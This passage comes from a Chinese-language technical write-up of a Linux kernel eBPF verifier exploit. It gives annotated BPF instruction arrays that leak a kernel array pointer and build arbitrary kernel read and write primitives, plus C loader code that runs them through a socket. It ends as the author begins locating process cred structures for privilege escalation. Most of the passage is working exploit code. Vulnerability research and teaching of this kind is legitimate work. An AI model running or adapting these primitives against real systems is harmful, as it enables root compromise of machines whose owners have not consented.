<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r7 = r1 + 8</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_7, BPF_REG_1)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// r6 = r8 - 0xE0</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_6, BPF_REG_8)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, <span class="number">0xE0</span>)</span><br><span class="line"><span class="comment">// *(u64 *)(r10 - 8) = r6</span></span><br><span class="line">BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, <span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里会将r10-16后r7个字节置零。</span></span><br><span class="line"><span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_9)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_10)</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_4, BPF_REG_7)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative)</span><br></pre></td></tr></table></figure>

<p>将栈上的 array 指针取出，并减去 0xE0 ，与前面对应，结果保存进 r6 。一加一减，verifier会认为 r6 仍为 array 指针，即等于 0xFFFF…10 。而实际上，r6 等于 0xFFFF…10 - 0xE0 。这里可以选择加减 0x10 ~ 0xE0 ，选择 0xE0 泄露的数据较多。接着，将 r6 所指向的 PAGE_SIZE 字节数据复制到 array 指针处，实现信息泄露。调试发现，泄露的数据中就包含 array 指针，在 0xFFFF…10 - 0x50 处。</p>
<p><img src="images/03.jpg" alt></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r6 = *(u64 *)(r10 - 8) - 0xE0</span></span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>)</span><br><span class="line">BPF_ALU64_IMM(BPF_SUB, BPF_REG_6, <span class="number">0xE0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将r6所指向的4096字节数据写入array map，实现信息泄露。</span></span><br><span class="line"><span class="comment">// 调试发现，r6+0xa0处为array map的地址。</span></span><br><span class="line"><span class="comment">// map_update_elem(ctx-&gt;comm_fd, 0, r6, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_2, BPF_REG_8)</span><br><span class="line">BPF_MOV64_REG(BPF_REG_3, BPF_REG_6)</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_4, <span class="number">0</span>)</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem)</span><br></pre></td></tr></table></figure>

<p>构造好程序后，就可将其加载进内核，attach 到 socket 上，向 socket 写入全零数据以覆盖栈上的 array 指针，再从 array map 中获取泄露的数据，从中找出 array 指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> prog = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insn, <span class="keyword">sizeof</span>(insn) / <span class="keyword">sizeof</span>(insn[<span class="number">0</span>]), <span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (prog &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not load program(do_leak):\n %s"</span>, bpf_log_buf);</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> err = bpf_prog_skb_run(prog, ctx-&gt;bytes, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not run program(do_leak): %d (%s)"</span>, err, strerror(err));</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line">err = bpf_lookup_elem(ctx-&gt;comm_fd, &amp;key, ctx-&gt;bytes);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not lookup comm map: %d (%s)"</span>, err, strerror(err));</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u64 array_map = (u64)ctx-&gt;ptrs[<span class="number">20</span>] &amp; (~<span class="number">0xFF</span>L);</span><br><span class="line"><span class="keyword">if</span> ((array_map&amp;<span class="number">0xFFFFF00000000000</span>) != <span class="number">0xFFFF800000000000</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">"Could not leak array map: got %p"</span>, (<span class="keyword">kaddr_t</span>)array_map);</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">int</span></span><br><span class="line">bpf_prog_skb_run(<span class="keyword">int</span> prog_fd, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err, socks[<span class="number">2</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> errno;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF,</span><br><span class="line">                    &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err = errno;</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(socks[<span class="number">1</span>], data, <span class="built_in">size</span>) != <span class="built_in">size</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">abort</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">abort</span>:</span><br><span class="line">    <span class="built_in">close</span>(socks[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-构造任意读、写原语"><a href="#4-3-构造任意读、写原语" class="headerlink" title="4.3 构造任意读、写原语"></a>4.3 构造任意读、写原语</h3><p>接下来构造的 eBPF 程序和上一程序及其类似，因此通过添加注释的方式进行说明。</p>
<p>实现任意读原语的 eBPF 程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">arbitrary_read</span>[] = &#123;</span></span><br><span class="line">    <span class="comment">// 保存r1，r1被内核初始化为指向skb的指针。</span></span><br><span class="line">    <span class="comment">// r9 = r1</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取array指针，r0类型为PTR_TO_MAP_VALUE_OR_NULL。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 必需的判断，令false分支的r0变成PTR_TO_MAP_VALUE类型。</span></span><br><span class="line">    <span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将array指针保存进r8。</span></span><br><span class="line">    <span class="comment">// r8 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取PTR_TO_MEM_OR_NULL类型指针，保存在r0。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 复制PTR_TO_MEM_OR_NULL类型指针，副本保存在r1。</span></span><br><span class="line">    <span class="comment">// r1 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    <span class="comment">// r1 = r1 + 1</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能发生。ringbuf的大小虽然为PAGE_SIZE，但其中一部分用于存储关于ringbuf的结构体，剩下的才用于存储数据。</span></span><br><span class="line">    <span class="comment">// 因此，请求保留PAGE_SIZE的内存不可能实现。</span></span><br><span class="line">    <span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 经过上面的NULL检查后，verifier认为r0=0。</span></span><br><span class="line">    <span class="comment">// 由于r1是由r0派生出来的，因此verifier也会认为r1=0。但实际上，r1=1。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// r7 = (r1 + 1) * 8</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verifier认为r7=8，但实际上r7=16。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试发现array指针都是0xFFFF..........10</span></span><br><span class="line">    <span class="comment">// 将该指针保存到r10-8处</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r10 - 8) = r8</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向r10-16写入r7=16个字节，覆盖r10-8处的array指针。</span></span><br><span class="line">    <span class="comment">// 写入字节为可控，可将array指针改成任意地址。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取修改后的指针。</span></span><br><span class="line">    <span class="comment">// r6 = *(u64 *)(r10 - 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取修改后指针所指向的8个字节数据，实现任意读。</span></span><br><span class="line">    <span class="comment">// 之所以可以读取成功，是因为verifier以为该指针仍为array指针。</span></span><br><span class="line">    <span class="comment">// r0 = *(u64 *)(r6 + 0)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, <span class="number">0</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将读取的数据写入array map传回用户态。</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r8 + 0) = r0</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>实现任意写原语的 eBPF 程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">arbitrary_write</span>[] = &#123;</span></span><br><span class="line">    <span class="comment">// 保存r1，r1被内核初始化为指向skb的指针。</span></span><br><span class="line">    <span class="comment">// r9 = r1</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取array指针，r0类型为PTR_TO_MAP_VALUE_OR_NULL。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_lookup_elem(ctx-&gt;comm_fd, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;comm_fd),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-4</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 必需的判断，令false分支的r0变成PTR_TO_MAP_VALUE类型。</span></span><br><span class="line">    <span class="comment">// if (r0 == NULL) exit(1)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将array指针保存进r8。</span></span><br><span class="line">    <span class="comment">// r8 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 获取PTR_TO_MEM_OR_NULL类型指针，保存在r0。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve),</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 复制PTR_TO_MEM_OR_NULL类型指针，副本保存在r1。</span></span><br><span class="line">    <span class="comment">// r1 = r0</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    <span class="comment">// r1 = r1 + 1</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不可能发生。ringbuf的大小虽然为PAGE_SIZE，但其中一部分用于存储关于ringbuf的结构体，剩下的才用于存储数据。</span></span><br><span class="line">    <span class="comment">// 因此，请求保留PAGE_SIZE的内存不可能实现。</span></span><br><span class="line">    <span class="comment">// if (r0 != NULL) &#123; ringbuf_discard(r0, 1); exit(2); &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 经过上面的NULL检查后，verifier认为r0=0。</span></span><br><span class="line">    <span class="comment">// 由于r1是由r0派生出来的，因此verifier也会认为r1=0。但实际上，r1=1。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// r7 = (r1 + 1) * 8</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_7, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, <span class="number">8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verifier认为r7=8，但实际上r7=16。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试发现array指针都是0xFFFF..........10</span></span><br><span class="line">    <span class="comment">// 将该指针保存到r10-8处</span></span><br><span class="line">    <span class="comment">// *(u64 *)(r10 - 8) = r8</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="number">-8</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向r10-16写入r7=16个字节，覆盖r10-8处的array指针。</span></span><br><span class="line">    <span class="comment">// 写入字节为可控，可将array指针改成任意地址。</span></span><br><span class="line">    <span class="comment">// r0 = bpf_skb_load_bytes_relative(r9, 0, r10-16, r7, 0)</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-16</span>),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_5, <span class="number">1</span>),</span><br><span class="line">    BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_skb_load_bytes_relative),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取修改后的指针。</span></span><br><span class="line">    <span class="comment">// r6 = *(u64 *)(r10 - 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_10, <span class="number">-8</span>),</span><br><span class="line">  	</span><br><span class="line">    <span class="comment">// 从array map中获取从用户态传入的数据。</span></span><br><span class="line">    <span class="comment">// r0决定写入8字节还是4字节，r1则为写入的值。</span></span><br><span class="line">    <span class="comment">// r0 = *(u64 *)(r8 + 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">    <span class="comment">// r1 = *(u64 *)(r8 + 8)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">8</span>),</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 实现任意写。</span></span><br><span class="line">    <span class="comment">// 之所以可以写入成功，是因为verifier以为r6仍为array指针。</span></span><br><span class="line">    <span class="comment">// if (r0 == 0) &#123; *(u64*)r6 = r1 &#125;</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP_IMM(BPF_JA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// else &#123; *(u32*)r6 = r1 &#125;</span></span><br><span class="line">    BPF_STX_MEM(BPF_W, BPF_REG_6, BPF_REG_1, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-定位进程cred"><a href="#4-4-定位进程cred" class="headerlink" title="4.4 定位进程cred"></a>4.4 定位进程cred</h3><p>调试发现，进程的 cred 有一定概率在泄露的 array 指针之后。因此需要多创建几个进程，避免利用失败。</p>
<p>所有进程通过 prctl(PR_SET_NAME, __ID__, 0, 0, 0) 将进程名称设置为固定字符串，在此使用 SCSLSCSL 。</p>
